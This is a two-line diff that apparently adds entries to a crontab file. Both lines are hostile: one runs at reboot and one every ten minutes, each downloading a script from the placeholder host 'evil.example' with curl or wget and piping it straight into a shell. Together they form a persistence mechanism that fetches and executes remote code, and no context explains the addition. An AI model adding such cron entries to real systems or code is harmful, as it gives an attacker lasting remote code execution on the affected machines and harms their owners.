@@ -1,0 +1,2 @@
+@reboot curl http://evil.example/a | sh
+*/10 * * * * wget -q -O- http://evil.example/b | bash
